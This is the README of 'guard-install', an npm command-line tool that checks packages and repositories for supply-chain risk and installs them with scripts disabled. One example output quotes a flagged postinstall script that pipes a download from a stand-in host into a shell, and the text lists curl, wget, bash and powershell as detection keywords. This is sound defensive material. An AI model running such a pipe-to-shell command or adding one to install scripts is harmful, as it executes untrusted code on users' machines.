# 🛡️ guard-install

[![npm version](https://img.shields.io/npm/v/guard-install.svg)](https://www.npmjs.com/package/guard-install)

<!-- [![downloads](https://img.shields.io/npm/dm/guard-install.svg)](https://www.npmjs.com/package/guard-install)
[![license](https://img.shields.io/npm/l/guard-install.svg)](./LICENSE) -->

> **Stop installing npm packages blindly.**

**guard-install** checks npm packages for risk **before** you install them. No database, no auth, fully local.

📦 npm: [https://www.npmjs.com/package/guard-install](https://www.npmjs.com/package/guard-install)

---

## 🚀 Try it now

```bash
npx guard-install axios
```

Or scan your entire project:

```bash
cd your-project
npx guard-install
```

Or install globally:

```bash
npm install -g guard-install
guard-install axios
```

👉 **Pro tip:** Run `guard-install` with no arguments inside any project — it's a drop-in replacement for `npm install`, but safer:

```bash
# Before (dangerous — runs postinstall scripts blindly)
npm install

# After (scans for risk, installs with --ignore-scripts)
guard-install
```

---

## 🔍 Three ways to use it

### Scan a package before installing

```bash
npx guard-install axios
```

### Scan a GitHub repo before running

```bash
npx guard-install --repo https://github.com/user/repo
```

### Scan & safely install your entire project

```bash
cd your-project
npx guard-install
```

---

## 🎬 Demo

![demo](https://github.com/dasanakudigenithin/guard-install/blob/main/assets/demo.gif)

```bash
$ npx guard-install axios

🔍 Analyzing: axios

✔ Created 12 years ago, last updated 10 days ago
✔ Established package (12 years ago)
⚠ Single maintainer
✔ No risky install scripts
✔ 101,100,738 weekly downloads
✔ No typosquat risk detected
✔ Package metadata looks normal

📦 Dependency Analysis

  9 dependencies scanned

Risk Score: 15/100 → LOW
Verdict: 🟢 Trusted
Confidence: HIGH

Top Risk Factors:
  - maintainers (+15)

? Proceed with safe install? (y/N)
```

### Repository Scanning

![repo-demo](https://github.com/dasanakudigenithin/guard-install/blob/main/assets/repo-demo.gif)

```bash
$ guard-install --repo https://github.com/axios/axios

🔍 Scanning repository: https://github.com/axios/axios

✔ 200 files scanned

  🌐 Network activity detected
    → The code makes outbound HTTP requests. This is expected for an HTTP client or API library.

  Risk: LOW — Minor signals detected (likely benign)
  Verdict: 🟢 Clean
  Confidence: LOW
```

---

## 🔐 Why this exists

npm installs packages without any safety checks by default. A single `npm install` can run arbitrary code on your machine via `postinstall` scripts.

With rising **supply chain attacks** and malicious packages, developers need a way to:

- **Understand** what they are installing
- **Detect** risky patterns early
- **Avoid** executing dangerous install scripts

Real threats `guard-install` catches:

- **Postinstall malware** — packages that execute `curl | sh` or download payloads on install
- **Typosquatting** — malicious packages with names like `axois` or `reacct`
- **Hijacked maintainers** — single-maintainer packages are takeover targets (see `event-stream`)
- **Dependency confusion** — internal package names published publicly to poison installs

`guard-install` adds a safety layer **before** any code runs.

---

## 🔍 What it does

Before installing a package, guard-install:

1. **Fetches npm metadata** — registry data, download counts, publish history
2. **Detects suspicious signals:**
   - Recent publish activity on new packages
   - Low maintainer count
   - Install scripts (`postinstall`, `preinstall`) with dangerous keywords
   - Low download count
   - Typosquatting risks
   - Missing metadata (no repo URL, version churn)
3. **Scans dependencies** — depth-limited (2 levels), parallelized, with concurrency control
4. **Computes weighted risk score** — 0-100 with confidence signal
5. **Explains the risk** — human-readable narrative of why a package is risky
6. **Installs safely** — always uses `--ignore-scripts` so postinstall malware never executes

---

## ✨ Features

- 🔍 **Pre-install risk analysis** — analyzes package metadata, scripts, and history before anything runs
- 📊 **Weighted risk scoring** — 0-100 score with LOW/MEDIUM/HIGH classification
- 🔗 **Dependency scanning** — recursive scan of transitive deps (depth-limited, parallelized)
- 🛡️ **Script inspection** — shows actual `postinstall`/`preinstall` content, flags `curl`, `wget`, `bash`, `powershell`
- 🎭 **Typosquat detection** — Levenshtein distance check against popular packages
- 🧠 **Risk explanation** — human-readable narrative explaining why a package is risky
- 📈 **Confidence signal** — tells you how much data backs the score
- 🔒 **Safe install** — always installs with `--ignore-scripts` so postinstall malware never executes
- 🚦 **Trust badges** — 🟢 Trusted / 🟡 Needs review / 🔴 Risky
- ⚡ **Caching** — 24h local cache for instant repeat scans (~250ms)
- 🔐 **Install modes** — `--strict` and `--paranoid` for different security postures
- 📋 **Project audit** — scan all dependencies in your project at once
- 🔬 **Repo scanning** — clone and scan git repositories for crypto scams, secret exfiltration, and malicious patterns

---

## ⚙️ Usage

```bash
guard-install <package> [options]
```

### Options

| Flag            | Description                                   |
| --------------- | --------------------------------------------- |
| `-y, --yes`     | Skip confirmation prompt, install immediately |
| `--dry-run`     | Analyze only, do not install                  |
| `--json`        | Output machine-readable JSON                  |
| `--explain`     | Show detailed score breakdown                 |
| `--strict`      | Block HIGH risk packages                      |
| `--paranoid`    | Block MEDIUM and HIGH risk packages           |
| `--repo <url>` | Scan a git repository for risky patterns       |
| `--audit`       | Scan all dependencies in current project      |
| `--ci`          | CI mode: JSON output, exit 1 on HIGH risk     |
| `-v, --version` | Show version number                           |
| `-h, --help`    | Show help                                     |

### Examples

```bash
# Scan + safe install current project (the killer workflow)
guard-install

# Single package analysis + prompt
guard-install axios

# Skip prompt, install directly
guard-install axios --yes

# Analysis only, no install
guard-install axios --dry-run

# Detailed score breakdown
guard-install axios --explain

# Block risky packages
guard-install axios --strict
guard-install axios --paranoid

# Audit entire project (summary only)
guard-install --audit

# Scan a git repo for malicious patterns
guard-install --repo https://github.com/user/suspicious-repo

# CI pipeline
guard-install axios --ci
```

---

## 📋 Output Examples

### Safe, popular package

```bash
$ guard-install express --dry-run

🔍 Analyzing: express

✔ Created 15 years ago, last updated 151 days ago
✔ Established package (15 years ago)
✔ Multiple maintainers (5)
✔ No risky install scripts
✔ 97,402,168 weekly downloads
✔ No typosquat risk detected
✔ Package metadata looks normal

📦 Dependency Analysis

  12 dependencies scanned

Risk Score: 0/100 → LOW
Verdict: 🟢 Trusted
Confidence: HIGH
```

### Package with install scripts

```bash
$ guard-install esbuild --dry-run

🔍 Analyzing: esbuild

✔ Created 8 years ago, last updated 29 days ago
✔ Established package (8 years ago)
⚠ Single maintainer
✗ Install scripts detected:
     postinstall: "node install.js"
✔ 216,460,377 weekly downloads
✔ No typosquat risk detected
✔ Package metadata looks normal

📦 Dependency Analysis

  1 dependencies scanned

Risk Score: 50/100 → MEDIUM
Verdict: 🟡 Needs review
Confidence: HIGH

Top Risk Factors:
  - scripts (+35)
  - maintainers (+15)

🧠 Why this is risky:

  • It has very few maintainers, increasing compromise risk
  • It contains a postinstall script that runs automatically on install
```

### Suspicious typosquat

```bash
$ guard-install axio --dry-run

🔍 Analyzing: axio

✔ Created 10 years ago, last updated 3819 days ago
✔ Established package (10 years ago)
✗ No maintainers listed
✔ No risky install scripts
⚠ Download count unavailable
✗ Name is similar to popular package "axios" (distance: 1)
⚠ no repository URL

📦 Dependency Analysis

  1 dependencies scanned

Risk Score: 100/100 → HIGH
Verdict: 🔴 Risky
Confidence: LOW (limited data available)

Top Risk Factors:
  - typosquat (+60)
  - maintainers (+20)
  - downloads (+20)

🧠 Why this is risky:

  • It has very few maintainers, increasing compromise risk
  • It has very few downloads, suggesting it's untested or unknown
  • Its name is suspiciously similar to a popular package (possible typosquat)
  • It's missing standard metadata (no repository URL)
  • This combination of signals is common in malicious packages
```

### Strict mode (blocks HIGH risk)

```bash
$ guard-install axio --strict

🔍 Analyzing: axio [STRICT]

...

Risk Score: 100/100 → HIGH
Verdict: 🔴 Risky

🚫 Blocked — HIGH risk package not allowed in strict mode
```

### Project scan (no args)

```bash
$ cd my-project
$ guard-install

📦 Found 42 dependencies

✔ 42 packages scanned

🟢 39 low risk
🟡 2 medium risk
🔴 1 high risk

High risk:
  • some-package
    → Install scripts detected: postinstall: "curl http://x | sh"

Medium risk:
  • esbuild
    → Install scripts detected: postinstall: "node install.js"

? ⚠ High risk packages detected. Proceed with safe install (--ignore-scripts)? (y/N)
```

When you run `guard-install` with no arguments inside a project, it:
1. Detects `package.json` automatically
2. Scans all dependencies for risk
3. Shows a clean summary
4. Prompts to install safely with `--ignore-scripts`

👉 This is **"npm install, but safer"**

### Project audit

```bash
$ guard-install --audit

🔍 Project Audit

✔ 5 dependencies scanned
  ⚠ 1 MEDIUM risk packages

  Top risks:

  • esbuild (Install scripts detected: postinstall: "node install.js")
```

### Repository scan

```bash
$ guard-install --repo https://github.com/user/suspicious-repo

🔍 Scanning repository: https://github.com/user/suspicious-repo

✔ 14 files scanned

  🚨 Potential secret exfiltration pattern
    → The code accesses sensitive data and makes network requests.
      This combination is commonly used to send private data to external servers.

  💰 Cryptocurrency functionality
    → Uses crypto/wallet libraries which may interact with sensitive assets.

  Risk: HIGH — Potential private key exfiltration pattern
  Verdict: 🔴 Risky
  Confidence: HIGH

  Flagged files:
    - src/wallet.js
    - lib/exfil.ts

  ⚠ Do NOT run this code locally without review
```

### Repository scan (safe library)

```bash
$ guard-install --repo https://github.com/web3/web3.js

🔍 Scanning repository: https://github.com/web3/web3.js

✔ 200 files scanned

  🔐 Sensitive data patterns found
    → References to sensitive data patterns (e.g., PRIVATE_KEY, MNEMONIC) were found.
      These may appear in examples or configuration, but should be reviewed in unfamiliar code.

  💰 Cryptocurrency functionality
    → Uses crypto/wallet libraries which may interact with sensitive assets.

  Risk: MEDIUM — Combination of signals warrants review
  Verdict: 🟡 Needs review
  Confidence: MEDIUM

  🧠 Why this matters:
    Crypto-related projects may interact with wallets and private keys.
    Even legitimate libraries should be reviewed before running unfamiliar code.
```

The repo scanner:
- Shallow clones (`--depth 1`) into a temp directory
- Only **reads** files — never runs `npm install`, `node`, or any script
- Scans for secret access, crypto libraries, network calls, and exfiltration patterns
- Deletes the clone immediately after scanning
- Safety bounded: max 200 files, 5KB per file, 6 levels deep, 2s timeout

### JSON output (CI-friendly)

```bash
$ guard-install axios --json
```

```json
{
  "package": "axios",
  "score": 15,
  "risk": "LOW",
  "confidence": "HIGH",
  "results": [
    {
      "name": "recency",
      "score": 0,
      "level": "info",
      "message": "Created 12 years ago, last updated 10 days ago"
    },
    {
      "name": "age",
      "score": 0,
      "level": "info",
      "message": "Established package (12 years ago)"
    },
    {
      "name": "maintainers",
      "score": 15,
      "level": "warn",
      "message": "Single maintainer"
    },
    {
      "name": "scripts",
      "score": 0,
      "level": "info",
      "message": "No risky install scripts"
    },
    {
      "name": "downloads",
      "score": 0,
      "level": "info",
      "message": "101,100,738 weekly downloads"
    },
    {
      "name": "typosquat",
      "score": 0,
      "level": "info",
      "message": "No typosquat risk detected"
    },
    {
      "name": "metadata",
      "score": 0,
      "level": "info",
      "message": "Package metadata looks normal"
    }
  ],
  "dependencies": { "scanned": 9, "highRisk": [], "mediumRisk": [] }
}
```

Exits with code `1` if risk is HIGH — use in CI to block risky installs.

---

## 🧠 How scoring works

| Detector     | What it checks                      | Max score | Weight |
| ------------ | ----------------------------------- | --------- | ------ |
| Recency      | Package age vs update time          | 40        | 1.0    |
| Age          | How old the package is              | 30        | 1.0    |
| Maintainers  | Number of maintainers               | 20        | 1.0    |
| Scripts      | Install hooks + dangerous keywords  | 80        | 1.0    |
| Downloads    | Weekly download count (log scale)   | 25        | 1.0    |
| Typosquat    | Name similarity to popular packages | 60        | 1.5    |
| Metadata     | Missing repo, version churn         | 15        | 1.0    |
| Dependencies | Inherited risk from dep chain       | 30        | 1.0    |
| Anomaly      | Suspicious publish patterns         | 10        | 1.0    |

**Final score** = `min(100, sum(capped_score × weight))`

| Score | Risk Level | Verdict      |
| ----- | ---------- | ------------ |
| ≥ 61  | 🔴 HIGH    | Risky        |
| ≥ 31  | 🟡 MEDIUM  | Needs review |
| ≤ 30  | 🟢 LOW     | Trusted      |

---

## 🔐 Install Modes

| Mode     | Command                        | Behavior                    |
| -------- | ------------------------------ | --------------------------- |
| Default  | `guard-install pkg`            | Analyze → prompt → install  |
| Strict   | `guard-install pkg --strict`   | Blocks HIGH risk            |
| Paranoid | `guard-install pkg --paranoid` | Blocks MEDIUM + HIGH        |
| CI       | `guard-install pkg --ci`       | JSON output, exit 1 on HIGH |

---

## 🏗️ Development

```bash
git clone https://github.com/dasanakudigenithin/guard-install
cd guard-install
npm install
npm run build
node dist/cli/index.js <package>
```

---

## 🤝 Contributing

Contributions are welcome. Feel free to open issues or PRs.

---

## ⚠️ Disclaimer

This tool helps identify potential risks, but does not guarantee complete safety. Always review critical dependencies manually.

---

## 📄 License

MIT
